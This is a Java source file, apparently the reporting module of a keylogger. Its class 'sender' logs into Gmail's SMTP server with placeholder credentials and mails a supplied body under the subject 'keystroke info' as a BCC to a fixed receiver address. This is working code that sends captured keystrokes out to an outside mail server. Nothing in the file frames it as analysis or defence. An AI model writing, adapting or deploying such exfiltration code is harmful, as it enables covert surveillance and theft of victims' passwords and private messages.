package Manager;

import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.sound.midi.Receiver;
import java.util.Properties;
import static javax.mail.Message.*;

public class sender {
    private sender(){
    }
   

    private static final String  GMAIL="dummy@gmail.com";//edit it to yours email
    private static final String  Password = "dummy";//edit it to your password  of the specified email
    private static final String  Receiver_email= "dummy@gmail.com";
    private static Properties mailServerProperties;
    private static Session mailSession;
    private static MimeMessage mailMessage;

    public static  void sendMail( String emailbody) throws Throwable{
        mailServerProperties = System.getProperties();
        mailServerProperties.put("mail.smtp.port", "587");
        mailServerProperties.put("mail.smtp.auth", "true");
        mailServerProperties.put("mail.smtp.starttls.enable","true" );

        mailSession = Session.getDefaultInstance(mailServerProperties);
        mailMessage = new MimeMessage(mailSession);
        mailMessage.addRecipient(RecipientType.BCC,new InternetAddress(Receiver_email));
        mailMessage.setSubject("keystroke info");
        mailMessage.setContent(emailbody, "text/html");

        Transport transport = mailSession.getTransport("smtp");
        transport.connect("smtp.gmail.com",GMAIL,Password);
        transport.sendMessage(mailMessage,mailMessage.getAllRecipients());
        transport.close();
    }




}
